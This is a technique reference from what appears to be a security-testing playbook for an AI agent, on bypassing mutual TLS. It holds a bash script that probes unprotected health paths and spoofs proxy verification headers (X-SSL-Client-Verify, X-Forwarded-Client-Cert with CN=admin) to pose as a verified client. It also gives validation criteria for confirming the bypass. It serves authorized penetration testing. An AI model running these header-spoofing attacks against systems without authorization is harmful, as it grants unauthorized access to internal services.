# HUNT-TLS-NETWORK — TLS/SSL & DNS Security — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Phase 8 — mTLS Bypass Attempts



```bash

# Check if endpoint requires client certificate

curl -sk "https://$TARGET/internal/" 2>&1 | grep -i "ssl\|certificate\|403\|401"



# Try without client cert (should fail)

curl -sk --cert "" "https://$TARGET/internal/api" | head -5



# Try common bypass paths (some apps skip mTLS on health checks)

for path in /health /ping /status /metrics /api/health; do

  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")

  echo "$path: $STATUS"

done



# Header-injection bypass — nginx/HAProxy/Envoy commonly terminate mTLS at the edge and

# forward the verdict as a request header the backend trusts. If the edge does NOT strip

# client-supplied copies of that header, you spoof a verified client. Try the real header

# names used by each proxy:

for combo in \

  "X-SSL-Client-Verify: SUCCESS|X-SSL-Client-S-DN: CN=admin" \

  "ssl-client-verify: SUCCESS|ssl-client-subject-dn: CN=admin" \

  "X-Client-Verify: SUCCESS|X-Client-DN: CN=admin,O=target" \

  "X-Forwarded-Client-Cert: By=spiffe://x;Hash=0;Subject=\"CN=admin\""; do

  H1="${combo%%|*}"; H2="${combo##*|}"

  echo "== $H1 / $H2 =="

  curl -sk "https://$TARGET/internal/api" -H "$H1" -H "$H2" -o /dev/null -w "%{http_code}\n"

done

```



**mTLS-bypass validation — this is a real auth bypass, so prove access, not just a status code:**

- A `200` could be a generic page. Confirm you reached **authenticated-only functionality**: show data/an action that is impossible without the client cert (e.g. an admin-only object, an internal-only response body).

- Distinguish *server policy* from *server state*: a `403` flipping to `200` with the spoofed header is meaningful; a `200` for both with and without the header means the path was never protected (no finding).

- For the bypass-path angle (`/health`, `/metrics`): only a finding if that endpoint exposes **sensitive data** (internal IPs, build secrets, Prometheus metrics revealing internal topology) — an empty `200 OK` health probe is not.

- Capture the request/response pair in Burp Repeater so the spoofed header → privileged response is unambiguous.



---
